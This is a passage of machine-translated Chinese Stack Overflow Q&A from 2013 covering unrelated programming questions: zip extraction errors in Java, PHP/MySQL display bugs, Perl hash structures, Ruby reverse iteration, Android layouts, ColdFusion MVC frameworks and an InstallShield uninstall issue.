如果一行中最后一个数据项之后的字符是换行符，则此代码可以正常工作，否则会失败。在事先不知道数据尺寸的情况下从文件中读取二维数据的可靠方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T05:55:50.823

一种简单的方法是使用`fgets`一次读取一行。然后，您可以使用`strtol`读取值。利用`endptr`它设置的指针，您可以读取下一个值。

或者，您可以通过一次读取一个字符来创建一个简短的函数来吃空白。你可以在那里处理换行符。读取直到遇到非空白字符，然后使用 . 将该字符放回流中`ungetc`。像这样的东西：

```
// Returns false if EOF or error encountered.
int eat_whitespace( FILE *fp, int *bNewLineEncountered )
{
    int c;
    *bNewLineEncountered = 0;

    while( EOF != (c = fgetc(fp)) ) {
        if( c == '\n' ) {
            *bNewLineEncountered = 1;
        } else if( !isspace(c) ) {
            ungetc(c, fp);
            break;
        }
    }

    return (c != EOF);
} 
```

# java - 如何修复 org.apache.commons.compress.archivers.zip.UnsupportedZipFeatureException（epub mimetype）？

> ID：15738312
> 
> 赞同：5
> 
> 时间：2013-04-01T05:50:30.867
> 
> 标签：java, exception, zip

我的 jboss 显示错误，而 zip 文件正在解压缩过程中。

错误信息

```
14:36:20,663 ERROR [STDERR] org.apache.commons.compress.archivers.zip.UnsupportedZipFeatureException: unsupported feature data descriptor used in entry mimetype
14:36:20,663 ERROR [STDERR]     at org.apache.commons.compress.archivers.zip.ZipArchiveInputStream.read(ZipArchiveInputStream.java:245)
14:36:20,663 ERROR [STDERR]     at java.io.InputStream.read(Unknown Source) 
```

这是 test.epub 条目的一部分

```
Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
--------  ------  ------- ---- ---------- ----- --------  ----
  20  Stored       20   0% 03-18-2013 14:39 2cab616f  mimetype
   0  Stored        0   0% 03-18-2013 10:42 00000000  META-INF/
 265  Defl:N      187  29% 03-18-2013 10:42 4d7842ce  META-INF/container.xml
1048  Defl:N      271  74% 03-18-2013 10:42 c04d123d  META-INF/encryption.xml
   0  Stored        0   0% 03-18-2013 12:05 00000000  OEBPS/
1014  Defl:N      530  48% 03-18-2013 12:05 cb8218d1  OEBPS/9.html 
```

LIB：commons-compress-1.4.jar 1.5 版本显示相同的错误消息。

任何人都知道为什么会发生错误以及我如何解决它？

添加代码

```
public void unzip(InputStream is, File destDir, String charsetName)
        throws IOException {
    ZipArchiveInputStream zis;
    ZipArchiveEntry entry;
    String name;
    File target;
    int nWritten = 0;
    BufferedOutputStream bos;
    byte[] buf = new byte[1024 * 8];
    zis = new ZipArchiveInputStream(is, charsetName, false);
    while ((entry = zis.getNextZipEntry()) != null) {
        name = entry.getName();
        target = new File(destDir, name);
        if (entry.isDirectory()) {
            target.mkdirs();
        } else {
            Util.createParentDirectory(target);
            target.createNewFile();
            bos = new BufferedOutputStream(new FileOutputStream(target));
            while ((nWritten = zis.read(buf)) >= 0) {
                bos.write(buf, 0, nWritten);
            }
            bos.close();
            debug("file : " + name);
        }
    }
    zis.close();
} 
```

当我使用其他 LIB(Java.util.zip) 时，也会显示下面的异常。

```
java.util.zip.ZipException: only DEFLATED entries can have EXT descriptor
    at java.util.zip.ZipInputStream.readLOC(Unknown Source)
    at java.util.zip.ZipInputStream.getNextEntry(Unknown Source) 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2014-03-12T09:42:00.523

发生这种情况是因为您将所谓的“数据描述符”附加到此“mimetype”文件中。默认情况下（和规范）只允许 DEFLATED 文件有这个，但你有它在 STORED （解压缩 ZIP 中的文件。）

只需使用 allowStoredEntriesWithDataDescriptor=true 构建您的 ZipArchiveInputStream。

```
public ZipArchiveInputStream(InputStream inputStream,
                         String encoding,
                         boolean useUnicodeExtraFields,
                         boolean allowStoredEntriesWithDataDescriptor) 
```

# php - 数据不显示在php中

> ID：15738317
> 
> 赞同：-6
> 
> 时间：2013-04-01T05:50:52.197
> 
> 标签：php, mysql, join, phpmyadmin

我有这个显示预订详细信息的 PHP 脚本。它工作正常并显示日期、时间、医生和房间。

```
<!DOCTYPE html>
<?php
session_start();
?>
<html>
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-status-bar-style" content="black" />
        <title>
        </title>
        <link rel="stylesheet" href="https://ajax.aspnetcdn.com/ajax/jquery.mobile/1.2.0/jquery.mobile-1.2.0.min.css" />
        <link rel="stylesheet" href="my.css" />
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js">
        </script>
        <script src="https://ajax.aspnetcdn.com/ajax/jquery.mobile/1.2.0/jquery.mobile-1.2.0.min.js">
        </script>
        <script src="my.js">
        </script>
        <!-- User-generated css -->
        <style>
        </style>
        <!-- User-generated js -->
        <script>
            try {

    $(function() {

    });

  } catch (error) {
    console.error("Your javascript has an error: " + error);
  }
        </script>
     </head>
    <body>
        <!-- Home -->
        <div data-role="page" id="page1">
            <div data-theme="a" data-role="header">
            <a data-role="button" data-theme="d" href="login.html" data-icon="arrow-l" data-iconpos="left" class="ui-btn-left">
                    Back
                </a>
                <a data-role="button" href="index.html" data-icon="home" data-iconpos="right" data-theme="d"class="ui-btn-right">
                 Home  
                </a>
                <h3>
                    Book appointment
                </h3>
           </div>

           <div data-role="content">
                <h3>
                    Select date/time:
                </h3>
                <br />
<?php
{
    mysql_connect("localhost" , "" , "") or die (mysql_error());
    mysql_select_db("") or die(mysql_error());

    $pid=intval($_SESSION["Patient_id"]); $query = "SELECT t1.*, t2.Doctor_name, t2.Doctor_room FROM Appointment AS t1 INNER JOIN Doctor AS t2 ON t1.Doctor_id=t2.Doctor_id";

    //executes query on the database
    $result = mysql_query ($query) or die ("didn't query");

    //this selects the results as rows
    $num = mysql_num_rows ($result);    

    //if there is only 1 result returned than the data is ok 
    if ($num == 1) {}
    {
        $row=mysql_fetch_array($result);
        $_SESSION['Appointment_date'] = $row['Appointment_date'];
        $_SESSION['Appointment_time'] = $row['Appointment_time'];
        $_SESSION['Doctor_name'] = $row['Doctor_name'];
        $_SESSION['Doctor_room'] = $row['Doctor_room'];
    }
}
?>  

        <strong>Dates available</strong>            
        <select id="Availability" name="Availability">                      
        <option value="0">--Select date--</option>
        <option value="3"><?php echo $_SESSION['Appointment_date'];?></option>
        </select>

        <br />
        <br />

        <strong>Times available</strong>            
        <select id="Availability" name="Availability">                      
        <option value="0">--Select time--</option>
        <option value="3"><?php echo $_SESSION['Appointment_time'];?></option>>
        </select>

        <br />
        <br />

            <strong>Doctor Name</strong>            
        <select id="Availability" name="Availability">                      
        <option value="0">--Name--</option>
        <option value="2"><?php echo $_SESSION['Doctor_name'];?></option>>
        </select>

        <br />
        <br />

            <strong>Doctor Room</strong>            
        <select id="Availability" name="Availability">                      
        <option value="0">--Room--</option>
        <option value="2"><?php echo $_SESSION['Doctor_room'];?></option>>
        </select>

        <br />
        <br />

                <label for="textarea1">
                Message GP
                </label>
                <textarea name="" id="textarea1" placeholder="">
                </textarea>

                <br />
                <br />

        <a data-role="button" data-theme="a" href="booked.php">
                    Book Appointment
                </a>  

             </div>
        </div>
    </body>
</html> 
```

我进入 phpmyadmin 并插入了另一个约会，以便用户可以选择，但这个约会不显示，只显示一个。有任何想法吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T05:55:59.367

这实际上是一个有趣的错误

```
if ($num == 1) {}
    {
        $row=mysql_fetch_array($result);
        $_SESSION['Appointment_date'] = $row['Appointment_date'];
        $_SESSION['Appointment_time'] = $row['Appointment_time'];
        $_SESSION['Doctor_name'] = $row['Doctor_name'];
        $_SESSION['Doctor_room'] = $row['Doctor_room'];
    } 
```

您将其设置为仅显示数据，`$num==1`但由于这些额外的原因，`{}`即使记录多于一个，它也会显示数据。因为该显示不在您的`if`块内，并且`if`对您的显示没有任何影响。但是您没有看到更多记录的原因是因为您只获取一次而不是循环

它必须像

```
while($row=mysql_fetch_assoc($result))
{
        $_SESSION['Appointment_date'] = $row['Appointment_date'];
        $_SESSION['Appointment_time'] = $row['Appointment_time'];
        $_SESSION['Doctor_name'] = $row['Doctor_name'];
        $_SESSION['Doctor_room'] = $row['Doctor_room'];
} 
```

# arrays - 使用哈希引用的最佳方式是什么？

> ID：15738320
> 
> 赞同：3
> 
> 时间：2013-04-01T05:51:06.090
> 
> 标签：arrays, performance, perl, hash, reference

我正在编写一个生成多个大型数组散列（HoA）数据结构的脚本。我正在尝试优化我的脚本，因为目前它需要花费大量时间来运行。

我做了一些基准测试。我设法使脚本执行大约。`@_`通过使用数组引用并通过直接使用而不是将其复制到变量中来减少子例程调用开销，速度提高了 3.5 倍。我还删除了不必要的子程序和多余的变量声明。尽管有这些改进，我还是想让代码运行得更快。

在我的脚本开始时，我解析一个大文件以生成两个 HoA 数据结构。这些关于哈希引用的方法中哪一种是最可行和最有效的？HoA 看起来像这样：

```
%HoA = (
    'C1' =>  ['1', '3', '3', '3'],
    'C2' => ['3','2'],
    'C3' => ['1','3','3','4','5','5'],
    'C4'  => ['3','3','4'],
    'C5' => ['1'],
); 
```

**选项1**

在我解析文件时生成 HoA（见下文）。最后将数组的哈希值放入哈希引用中。

```
my $hash_ref = \%HoA; 
```

**选项 2**

解析文件，使 HoA 中的每个键都有一个指向 array_ref 的值。最后将数组的哈希值放入哈希引用中。

===============

我觉得选项 2 是一个很好的方法，但我该怎么做呢？

这是我目前的做法。

```
use strict; use warnings;
open(F1, "file.txt") or die $!;
my %HoA = ();
    while (<F1>){
    $_=~ s/\r//;
    chomp;
    my @cols = split(/\t/, $_);

    push( @{$HoA{$cols[0]}}, @cols[1..$#cols]);
 }
close F1; 
```

我需要一个高效的数据结构来帮助我快速查找值和键。此外，我需要能够尽可能高效地将键值（数组）、键和 HoA 本身多次传递到子例程中。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T06:59:46.960

*   不要使用全局变量，包括文件句柄。
*   您声明`%HoA`并从未使用过。
*   您声明`$HoA_ref`但从未使用过它。
*   你`$HoA`没有声明就使用了。始终使用`use strict; use warnings;`
*   为什么要创建一个您不需要的引用并最终多次取消引用它？
*   没有理由为您刚刚创建的哈希分配一个空列表。`my %HoA = ();`很傻。
*   还不如结合`s///`和`chomp`;
*   `$_`不需要时省略，或者使用有意义的变量名。

上述所有内容和其他一些改进已获得：

```
use strict;
use warnings;

open(my $fh, '<', 'file.txt') or die $!;

my %HoA;
while (<$fh>){
    s/\r?\n\z//;
    my ($key, @cols) = split /\t/;
    push @{ $HoA{$key} }, @cols;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-01T06:21:55.233

我的经验是，最好尽可能使用参考。一些附加说明：

1.  如果你需要这个，`$_=~ s/\r//;`为了 Windows eol 兼容性，那么你需要一个更好的 perl 构建。ActiveState 通常是最健壮的。 `chomp`应该处理终端 cr/lf，或者更确切地说，读取的文件应该已经将 cr/lf 对转换为仅 lf。

2.  Perl`shift`是 O(1) 并且非常快。你可以在这里利用它来发挥你的优势。

3.  你无法提前知道什么是最快的。选择基准是唯一的出路。

4.  尝试单独读取输入文件而不进行处理。一旦作业受 I/O 限制，优化就不再有用了。

这是我要开始的：

```
 open(F, "file.txt") or die $!;
 my $h = {};
 while (<F>){
   chomp;
   my @cols = split "\t";
   my $key = shift @cols;
   push @{$h->{$key}}, @cols;
 }
 close F; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-01T06:19:04.630

我认为这就是您在示例中尝试做的事情。

```
open(my $fh, "<", "file.txt") or die $!;
my $HoA_ref = {}; # ref will return a HASH 
while (my $line = <$fh>) {
    $line =~ s/\r//;
    chomp $line;
    my @cols = split(/\t/, $line);

    # shift off first element in the list to use 
    # as the key
    my $key = shift(@cols);
    # set value to an array ref of whatever 
    # is left in the list.
    $HoA_ref->{$key} => [@cols];
}
close <$fh>; 
```

值得注意的是，`$key`如果在循环文件时出现多次，它将被覆盖。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-01T07:52:22.803

由于您有大文件，而不是使用 while 循环，我建议您使用模块[File::Slurp](http://search.cpan.org/~uri/File-Slurp-9999.19/lib/File/Slurp.pm)进行完整的文件 slurping 。

File::Slurp read_file 函数尝试使用 sysread（检查[read_file 源代码](http://cpansearch.perl.org/src/URI/File-Slurp-9999.19/lib/File/Slurp.pm)）调用绕过 perl I/O。

`my $text = read_file( $file ) ;`

# yii - 在 yii 框架中修改 Modules 路径

> ID：15738322
> 
> 赞同：0
> 
> 时间：2013-04-01T05:51:25.080
> 
> 标签：yii, yii-modules

我是 yii 框架的新手。我已经使用 gii 工具构建了类别模块，我必须输入以下 URL

```
http://localhost:8080/myadminpanel/index.php/category/category/create 
```

在这里，一类是模块 ID，另一类是控制器 ID。我怎样才能制作以下网址

```
http://localhost:8080/myadminpanel/index.php/category/create 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T10:00:49.817

我假设您知道在哪里定义[路线](http://www.yiiframework.com/doc/guide/1.1/en/topics.url "路线")：

```
'rules' => array(
    'category/create' => '/category/category/create' // For the "create" action
    'category/<action:w\+>' => '/category/category/<action>' // For all category routes
) 
```

# java - 如何在 Android 中为 facebook 设置 SessionDefaultAudience

> ID：15738324
> 
> 赞同：1
> 
> 时间：2013-04-01T05:51:38.303
> 
> 标签：java, android, facebook, facebook-graph-api, privacy

这两天我搜索了很多，但没有成功。我正在关注[Authenticate-Facebook Developers](http://developers.facebook.com/docs/tutorials/androidsdk/3.0/scrumptious/authenticate/)链接以设置 Facebook 本机登录。我将以下代码添加到`SplashFragment.java`：

```
authButton = (LoginButton) view.findViewById(R.id.fb_logIn_btn);
authButton.setPublishPermissions(PERMISSION);
authButton.setDefaultAudience(SessionDefaultAudience.ONLY_ME); 
```

但这不起作用。

在我的应用程序中，我想提醒用户进入隐私模式（`SessionDefaultAudience.EVERYONE`或`SessionDefaultAudience.ONLY_ME`或`SessionDefaultAudience.FRIENDS`）以通过应用程序为他们的帖子设置隐私设置。

我也经历了[Session.NewPermissionsRequest-Facebook Developers](https://developers.facebook.com/docs/reference/android/3.0/Session.NewPermissionsRequest) 但如何实现呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-03T19:23:39.693

您可以像这样更改受众和权限：

```
private void requestPublishPermissions(Session session) {
    if (session != null && !session.getPermissions().contains("publish_actions")) {
        System.out.println("SEESION Permission");
        Session.NewPermissionsRequest newPermissionsRequest = new Session.NewPermissionsRequest(mainFragment, Arrays.asList("publish_actions"));
        // demonstrate how to set an audience for the publish permissions,
        // if none are set, this defaults to FRIENDS
          .setDefaultAudience(SessionDefaultAudience.FRIENDS);
        session.requestNewPublishPermissions(newPermissionsRequest);
    }
} 
```

只需将此行更改为您想要的观众

```
.setDefaultAudience(SessionDefaultAudience.FRIENDS); 
```

# wordpress - wordpress 不存储数据，只向数据库添加新的空白条目

> ID：15738330
> 
> 赞同：-1
> 
> 时间：2013-04-01T05:52:16.650
> 
> 标签：wordpress

我安装了一个名为“Audience Intelligent”的插件。

该插件仍在开发中。但我想在我的网站上安装它。

**现在代码：**

```
add_action('wp_ajax_nopriv_audience_intel', 'audience_intel_ajax');
add_action('wp_ajax_audience_intel', 'audience_intel_ajax');
function audience_intel_ajax() {
$likeit = $_POST['button'];
$postid = $_POST['postid'];

global $wpdb;
$tablename = $wpdb->prefix . "intellike";

$newdata = array(
    'radio' => $likeit,
    'postid' => $postid
);

$wpdb->insert (
    $tablename,
    $newdata
);

if($likeit == 'Yes'){
    $options = get_option('audience_intel_options');
    echo $options['featured'];
}
else { ?>
    <form id="audience_intel_feedback">
        <p><strong><label>What can we do better?</label></strong></p>
        <textarea name="feedback" rows="10" cols="40"></textarea>
        <input type="hidden" value="<?php echo $postid;?>" name="postid">
    </form>
    <p><button id="audience_intel_fbutton" class="like">Fix this!</button></button>
<?php }
exit;
} 
```

**问题** 有一个新条目存储到数据库中。但缺少反馈文本。

在188 行附近[查看 Github ，](https://github.com/ebinnion/WordPress-Audience-Intel-Plugin/blob/master/audience-intelligence.php)

数据库截图。 [http://i.stack.imgur.com/yZRxi.png](http://i.stack.imgur.com/yZRxi.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:13:09.133

表单发布变量似乎存在一些问题。尝试通过在 ajax 调用中回显 post 变量进行调试，并使用警报在触发的 javascript 中打印它。另请参阅 - [http://codex.wordpress.org/AJAX_in_Plugins](http://codex.wordpress.org/AJAX_in_Plugins)。我认为在其他部分你也需要使用 echo 来创建新的表单。

# php - 查询留言列表

> ID：15738334
> 
> 赞同：1
> 
> 时间：2013-04-01T05:52:35.837
> 
> 标签：php, mysql, sugarcrm

我必须显示登录用户的消息线程。Well Showing 线程实际上不是问题。我在显示所有消息列表时遇到了麻烦。要求如下。

1) 消息列表页面 (message_list.php)：这里只显示登录用户发送或接收的最后一条消息。在这种情况下，登录用户可以是发送者或接收者。例如

用户“mahendra”是登录用户。并与许多其他用户进行了交流，比如 John、Smith、Sandra。在 message_list.php 页面上，每个用户只应显示最后一条消息。

数据库结构如下：

id(pk),from_id,to_id,消息

这应该是什么查询？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:00:41.983

假设您当前用户的 id 是 5

```
SELECT message FROM yourTable WHERE to_id=5 OR from_id=5 ORDER BY id DESC LIMIT 1 
```

# ruby - Ruby 数组 reverse_each_with_index

> ID：15738336
> 
> 赞同：19
> 
> 时间：2013-04-01T05:52:37.967
> 
> 标签：ruby

我想`reverse_each_with_index`在数组上使用类似的东西。

例子：

```
array.reverse_each_with_index do |node,index|
  puts node
  puts index
end 
```

我看到 Ruby 有，`each_with_index`但它似乎没有相反的东西。还有另一种方法可以做到这一点吗？

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2013-11-27T16:57:25.297

如果你想要数组中元素的真实索引，你可以这样做

```
['Seriously', 'Chunky', 'Bacon'].to_enum.with_index.reverse_each do |word, index|
  puts "index #{index}: #{word}"
end 
```

输出：

```
index 2: Bacon
index 1: Chunky
index 0: Seriously 
```

您还可以定义自己的 reverse_each_with_index 方法

```
class Array
  def reverse_each_with_index &block
    to_enum.with_index.reverse_each &block
  end
end

['Seriously', 'Chunky', 'Bacon'].reverse_each_with_index do |word, index|
  puts "index #{index}: #{word}"
end 
```

优化版本

```
class Array
  def reverse_each_with_index &block
    (0...length).reverse_each do |i|
      block.call self[i], i
    end
  end
end 
```

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2013-04-01T05:54:12.780

首先`reverse`是数组，然后使用`each_with_index`：

```
array.reverse.each_with_index do |element, index|
  # ...
end 
```

虽然，索引将从`0`到`length - 1`，而不是相反。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-04-01T06:05:37.867

好吧，既然 Ruby 总是喜欢给你选择，你不仅可以：

```
arr.reverse.each_with_index do |e, i|

end 
```

但你也可以这样做：

```
arr.reverse_each.with_index do |e, i|

end 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2017-12-04T06:12:07.613

不复制数组：

```
(array.size - 1).downto(0) do |index|
  node = array[index]
  # ...
end 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-04-01T05:55:09.630

简单地

```
arr.reverse.each_with_index do |node, index| 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-01-03T15:42:41.850

在我的用例中，我想使用负索引向后迭代

```
a = %w[a b c] 
(1..a.size).each {|i| puts "-#{i}: #{a[-i]}"}
# => -1: c
# => -2: b
# => -3: a 
```

# asp.net-mvc-4 - 如何在coldfusion中实现MVC

> ID：15738337
> 
> 赞同：-2
> 
> 时间：2013-04-01T05:52:44.160
> 
> 标签：asp.net-mvc-4, coldfusion

我们如何在 Coldfusion 中实现 MVC 4 概念 模型-视图-控制器 (MVC) 架构模式将应用程序分为三个主要组件：模型、视图和控制器。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-01T07:09:00.827

ColdFusion 中有许多可用的 MVC 框架。没有必要自己动手。这是一个选择：

*   [框架 1](http://fw1.riaforge.org/)
*   [冷盒](http://www.coldbox.org/)
*   [项目清单](http://cfwheels.org/)
*   [模型胶](http://www.model-glue.com/)
*   [马赫-II](http://www.mach-ii.com/)

我用过 ModelGlue 并且非常喜欢它。我已经对 FW/1 进行了修改，下次我开始一个项目时它会是我的首选框架，而且我已经用 ColdBox 完成了一个项目，它对我来说有点太重了。话虽如此，很多人真的歌颂ColdBox，所以不一定相信我的话。

最好的办法是在这个地方放一个谷歌，看看人们在说什么，然后试一试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T13:40:30.160

虽然 CF 主要是一种基于标签的语言，但它的任务和操作都适合模型/视图/控制器体系结构 (MVC) 并在面向对象的环境中这样做。自然地，您可以构建具有或不具有 OO 和 MVC 功能的应用程序。那些从 CF 开始开发生涯的人往往更愿意在没有此类框架的情况下构建应用程序，而那些从其他开发语言来到 CF 的人似乎更喜欢这些东西。

无论哪种方式，都没有在 CF 中实现 MVC 架构的最佳方式。然而，有许多 MVC 框架与 CF 一致，甚至在开发时考虑到了 CF。那些是：

*   CF车轮
*   保险丝盒
*   模型-胶水
*   冷盒
*   机器二
*   FW/1

就个人而言，多年来我一直在没有应用严格 MVC 架构的框架的情况下工作，但我也看到了它们在某些情况下如何有用。除了这些商业努力之外，开发人员还可以并且做“自己动手”。对于所有这些框架要记住的是，它们利用了 CF 的原生 OO 功能，但简单来说，它们使用了一系列 CFINCLUDES 来引入控制、数据操作和表示层。

无论如何，看看那些，看看是否对你有任何吸引力。我从其他开发者那里听到了关于 FW/1 的好消息。有人告诉我它很轻巧，不会给你的 CF 开发人员带来过多的负担（而 Fusebox 和 ColdBox 等其他选项当然可以）。

# java - 自动缩放的 Android 2x2 行图像

> ID：15738339
> 
> 赞同：1
> 
> 时间：2013-04-01T05:52:48.603
> 
> 标签：java, android

我正在寻找创建自动缩放的 2x2 行的最佳解决方案。到目前为止，我遇到的问题是左侧图像是全尺寸的，而右侧图像被缩小了很多。

图片为 400x400 像素，可能需要在所有设备上显示。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T05:55:48.150

`TableLayout`在您的 XML 布局文件中使用 Android 。

注意：`GridView`如果您的表中有可变数量的行，将是合适的。

**2x2 示例**：

```
<TableLayout
    android:layout_width="match_parent"
    android:layout_height="wrap_content" >
    <TableRow
        android:layout_width="match_parent"
        android:layout_height="wrap_content" >
        <ImageView android:layout_weight="1"
            android:id="@+id/imageView1"
            android:layout_width="match_parent"
            android:layout_height="wrap_content" />
        <ImageView android:layout_weight="1"
            android:id="@+id/imageView2"
            android:layout_width="match_parent"
            android:layout_height="wrap_content" />
    </TableRow>
    <TableRow
        android:layout_width="match_parent"
        android:layout_height="wrap_content" >
        <ImageView android:layout_weight="1"
            android:id="@+id/imageView3"
            android:layout_width="match_parent"
            android:layout_height="wrap_content" />
        <ImageView android:layout_weight="1"
            android:id="@+id/imageView4"
            android:layout_width="match_parent"
            android:layout_height="wrap_content" />
    </TableRow>
</TableLayout> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:07:09.933

在您的情况下， [TableLayout](http://developer.android.com/reference/android/widget/TableLayout.html)可以正常工作，它保持固定数量的列，并且使用[GridView](http://developer.android.com/guide/topics/ui/layout/gridview.html)您必须处理适配器和其他东西才能实现。

下面是一个使用 Imageview 创建 2x2 列的简单示例。

```
 <TableLayout
    android:id="@+id/tableLayout1"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content" >

    <TableRow
        android:id="@+id/tableRow3"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content" >

        <ImageView
            android:id="@+id/button1"
            android:layout_weight="1"
            android:layout_width="fill_parent"
            android:background="@drawable/ic_launcher"
            android:layout_height="wrap_content" />

        <ImageView
            android:id="@+id/button2"
            android:layout_weight="1"
            android:layout_width="fill_parent"
              android:background="@drawable/ic_launcher"
            android:layout_height="wrap_content" />
    </TableRow>

</TableLayout> 
```

# c# - 在 Windows Phone 8 页面之间传递特殊字符作为字符串

> ID：15738345
> 
> 赞同：2
> 
> 时间：2013-04-01T05:53:39.273
> 
> 标签：c#, windows-phone-8, special-characters

我正在尝试将特殊字符作为字符串传递，例如`&`用户`#`在文本框中输入的字符串。

然后将此字符串传递到下一页

```
NavigationService.Navigate(new Uri(String.Format("/Pages/EditNote.xaml?note={0}", strText), UriKind.Relative)); 
```

然后`EditNote.xaml`页面检查 note 参数并获取其值

```
protected override void OnNavigatedTo(NavigationEventArgs e)
{
        base.OnNavigatedTo(e);

        if (NavigationContext.QueryString.ContainsKey("note"))
        {
            noteText = NavigationContext.QueryString["note"];
        }
} 
```

问题是 noteText 在它是非字母数字字符（例如 等）时将始终为`&`空`#`。

我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-12-18T14:09:46.147

由于特殊字符在 url 构造中具有预定义的含义，因此会与带有特殊字符的 url + 数据混淆。

如果在您的上下文中没问题，您也可以使用 IsolatedStorageSettings。

来源页面：

```
IsolatedStorageSettings settings = IsolatedStorageSettings.ApplicationSettings;

if (!settings.Contains("note"))
{
     settings.Add("note", "$#$#$#%#%#????===&&&&&some note Text!#@#@@@  someText @$$@%@%@%@^@@&^*@&(*(**)*)_((_(_(_*(&*(^*&%&%*)");
}

settings.Save();

NavigationService.Navigate(new Uri(@"/Pages/EditNote.xaml", UriKind.Relative)); 
```

目标页面：

```
string note = string.Empty;
IsolatedStorageSettings settings = IsolatedStorageSettings.ApplicationSettings;
if (settings.Contains("note"))
{
    note = settings["note"] as string;
} 
```

在这里您可以传递所有特殊字符。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T19:54:27.227

尝试使用 UrlEncoding 对特殊字符进行编码。

# android - 任何用于从相机以连拍模式拍照的应用程序如何工作？

> ID：15738346
> 
> 赞同：3
> 
> 时间：2013-04-01T05:53:42.100
> 
> 标签：android

我见过像 Fast Burst Camera Lite 这样的应用程序可以毫无延迟地进行连拍（当然，照片质量会有所妥协）。我只是好奇这些应用程序是如何工作的。我在互联网上看到了一些网站，但没有满意的答案。因此，我只是想在这里发布它以进行良好的讨论。没有正确或错误的答案。我只是想讨论一下。欢迎任何想法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T05:53:42.100

我观察到的一件事是这个应用程序“Fast Camera Lite”没有滞后。它可能正在使用多线程。一个线程仅捕获图像，而另一个线程保存图像。为了减少延迟，应用程序可能只是让第一个线程捕获图像并将图像数据转储到队列中，而第二个线程从队列中读取数据并将其写入 SD 卡。由于队列只能由两个（或可能多个）线程同时访问，因此我们需要一个线程安全队列，如`ConcurrentLinkedQueue`.

除此之外，我想我*可能*需要为相机定义自己的代码，而不是仅仅调用相机活动，因为默认的相机活动在拍摄照片后会有延迟。我可以只使用相机源（用于查看我指向的位置）开始全屏活动，并有一个按钮在单击按钮时存储当前的相机视图（或拍摄图像）。

# mysql - 如何在mysql中查找表依赖项

> ID：15738365
> 
> 赞同：3
> 
> 时间：2013-04-01T05:55:36.677
> 
> 标签：mysql, database

我创建了一个包含主键和外键的表。现在我想知道将我的表元素作为外键引用的表是什么。

例如，`student`是一个包含`id (primary key), name`元素的表。并且`standard`是另一个包含`class_id (primary key), and stud_id (Foreign key refers student table id field)`. 当我将学生表和 id 字段作为输入时，它会返回标准表作为输出。请建议我如何实现这一目标？？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:02:53.820

那么这里是你的问题的解决方案的链接。

[如何查看表或列的所有外键？](https://stackoverflow.com/questions/201621/how-do-i-see-all-foreign-keys-to-a-table-or-column)

[mysql innodb：描述表不显示列引用，显示它们的是什么？](https://stackoverflow.com/questions/1893168/mysql-innodb-describe-table-does-not-show-columns-references-what-does-show-th)

核实。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T05:59:35.870

好的，缺少一些东西，你没有告诉你是如何实现这一点的，你正在使用什么操作系统，你想用脚本来做吗？如果是这样，什么语言，你使用什么数据库管理系统？让我知道，你的答案就准备好了

好的，就是这样，如果你愿意，你可以删除最后一行

```
SELECT standard.ID
FROM student INNER JOIN standard ON student.ID = standard.stud_id
GROUP BY standard.ID; 
```

# windows-installer - 卸载期间自定义操作不起作用

> ID：15738366
> 
> 赞同：0
> 
> 时间：2013-04-01T05:55:39.853
> 
> 标签：windows-installer, installshield, installshield-2011

我正在使用 Installshield 2011 开发安装程序，项目类型是基本 MSI，我有自定义操作，它的排序方式应在卸载期间执行。这是我配置的自定义操作属性的附加快照。

![用于卸载的附加自定义操作的快照](https://i.stack.imgur.com/oQ49t.png)

我面临的问题是在卸载期间未执行配置的自定义操作，最终安装的应用程序将不会被删除。

以下是详细日志记录的条目：

```
00532: (Unknown): InstallShield 11:01:17: Registering Msi Server...

00533: (Unknown): InstallShield 11:01:17: **Invoking script function MyFunction**

00534: (Unknown): InstallShield 11:01:17: **CallScriptFunctionFromMsiCA() ends**

00535: (Unknown): CustomAction NewCustomAction1 returned actual error code 1603 (note this may not be 100% accurate if translation happened inside sandbox)

00536: (Unknown): Action ended 11:01:17: **NewCustomAction1\. Return value 3.**

00537: (Unknown): Action ended 11:01:17: **INSTALL. Return value 3.**

00538: (Property): Property(S): DiskPrompt = [1]

00539: (Property): Property(S): UpgradeCode = {40AD9645-1459-4C32-8285-D1C0B163361D}

00540: (Property): Property(S): ProductCode = {84BDE810-2C23-48CA-A638-5B131DA3B57F} 
```

我在这里错过了什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T13:49:53.813

